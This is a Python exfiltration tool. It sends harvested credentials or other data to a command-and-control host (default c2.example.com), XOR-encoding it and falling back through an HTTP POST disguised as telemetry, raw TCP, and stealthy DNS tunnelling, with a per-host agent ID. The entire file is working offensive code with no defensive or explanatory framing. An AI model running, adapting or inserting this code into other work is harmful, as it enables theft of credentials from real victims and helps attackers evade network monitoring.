credential_exfil_encrypted.code:
#!/usr/bin/env python3
"""Encrypted credential exfiltration — send harvested data via encrypted channel.
Supports multiple exfil methods: HTTP POST, DNS, raw TCP."""

import json
import socket
import os
import hashlib
import sys

EXFIL_HOST = os.environ.get("EXFIL_HOST", "c2.example.com")
EXFIL_PORT = int(os.environ.get("EXFIL_PORT", "8080"))
AGENT_ID = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]

def xor_encrypt(data, key=None):
    """XOR stream cipher."""
    if key is None:
        key = bytes([90, 60, 126, 29, 169, 240, 66, 139, 201, 55, 178, 93, 11, 222, 44, 157])
    if isinstance(data, str):
        data = data.encode()
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def exfil_http(data):
    """Exfiltrate via HTTP POST with XOR encryption."""
    encrypted = xor_encrypt(data)
    body = encrypted.hex().encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((EXFIL_HOST, EXFIL_PORT))
    req = (f"POST /api/v1/telemetry HTTP/1.1\r\n"
           f"Host: {EXFIL_HOST}\r\n"
           f"Content-Length: {len(body)}\r\n"
           f"Content-Type: application/octet-stream\r\n"
           f"X-Agent: {AGENT_ID}\r\n"
           f"Connection: close\r\n\r\n").encode() + body
    s.sendall(req)
    resp = s.recv(4096)
    s.close()
    return resp

def exfil_dns(data, domain=None):
    """Exfiltrate via DNS queries (slow but stealthy)."""
    domain = domain or EXFIL_HOST
    encrypted = xor_encrypt(data)
    encoded = encrypted.hex()
    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    for i, chunk in enumerate(chunks):
        label = f"{AGENT_ID}.{i}.{chunk}.{domain}"
        try:
            socket.getaddrinfo(label, None, socket.AF_INET)
        except socket.gaierror:
            pass
    return len(chunks)

def exfil_tcp(data):
    """Exfiltrate via raw TCP with length-prefix framing."""
    encrypted = xor_encrypt(data)
    import struct
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((EXFIL_HOST, EXFIL_PORT))
    header = struct.pack("!I", len(encrypted)) + AGENT_ID.encode()
    s.sendall(header + encrypted)
    s.close()

def exfil_auto(data):
    """Try exfil methods in order: HTTP → TCP → DNS."""
    methods = [
        ("http", exfil_http),
        ("tcp", exfil_tcp),
        ("dns", exfil_dns),
    ]
    for name, fn in methods:
        try:
            fn(data)
            return name
        except Exception:
            continue
    return None

if __name__ == "__main__":
    # Read data from stdin or file argument
    if len(sys.argv) > 1:
        data = open(sys.argv[1], "rb").read()
    else:
        data = sys.stdin.buffer.read()
    method = exfil_auto(data)
    if method:
        print(f"Exfiltrated {len(data)} bytes via {method}")
    else:
        print("All exfil methods failed")
